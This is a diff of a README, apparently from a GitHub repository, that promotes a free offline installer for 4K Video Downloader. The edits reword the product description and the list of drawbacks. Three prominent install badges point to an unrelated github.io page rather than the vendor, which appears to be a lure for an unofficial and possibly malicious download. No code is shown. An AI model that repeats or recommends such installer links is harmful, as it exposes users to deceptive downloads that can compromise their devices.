@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Video+Downloader-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 4K Video Downloader Free Installer** — 4K Video Downloader is a popular tool for downloading videos, playlists, channels, and subtitles from YouTube and other platforms in resolutions up to 8K. Works without internet access, no account required. Full offline installation.
+**💻 4K Video Downloader Free Installer** — 4K Video Downloader is a Windows and macOS application for downloading videos, playlists, channels, and subtitles from YouTube, Vimeo, Facebook, and other platforms in resolutions up to 8K. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install 4K Video Downloader](https://img.shields.io/badge/⬇_Install_4K%20Video%20Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install 4K Video Downloader](https://img.shields.io/badge/⬇_Install_4K+Video+Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About 4K Video Downloader
 
-4K Video Downloader is a popular tool for downloading videos, playlists, channels, and subtitles from YouTube and other platforms in resolutions up to 8K. It features a clean interface, batch download support, and proxy settings for restricted regions.
+4K Video Downloader is a Windows and macOS application for downloading videos, playlists, channels, and subtitles from YouTube, Vimeo, Facebook, and other platforms in resolutions up to 8K. Features one-click subscription channel downloads, smart mode for consistent quality settings, and in-app proxy configuration. Used for offline video archiving and learning content download.
 
 ---
 
 ## ❌ Problem: 4K Video Downloader is hard to access
 
-- **Paid Limit on Free Tier** — Free version caps concurrent downloads and some format options
-- **Platform Dependency** — Relies on platform APIs that can break with site updates
-- **No Built-in Editor** — Downloaded files cannot be trimmed or edited within the app
-- **Subscription Pricing** — Switched to subscription model frustrating long-time users
+- **Legal Considerations** — Downloading copyrighted content may violate terms and copyright law
+- **Commercial License** — Free version has download limits; Plus version removes them
+- **Platform API Changes** — YouTube changes can disrupt download functionality
+- **Speed Limitation** — Free tier limits simultaneous downloads
 
 ---
 
@@ -81,7 +81,7 @@
 
 <div align="center">
 
-[![⬇ Install 4K Video Downloader](https://img.shields.io/badge/⬇_Install_4K%20Video%20Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install 4K Video Downloader](https://img.shields.io/badge/⬇_Install_4K+Video+Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@
 
 ---
 
-**4K Video Downloader Free Installer** — 4K Video Downloader is a popular tool for downloading videos, playlists, channels, and subtitles from YouTube and other platforms in resolutions up to 8K. Install without internet connection today!
+**4K Video Downloader Free Installer** — 4K Video Downloader is a Windows and macOS application for downloading videos, playlists, channels, and subtitles from YouTube, Vimeo, Facebook, and other platforms in resolutions up to 8K. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install 4K Video Downloader](https://img.shields.io/badge/⬇_Install_4K%20Video%20Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install 4K Video Downloader](https://img.shields.io/badge/⬇_Install_4K+Video+Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
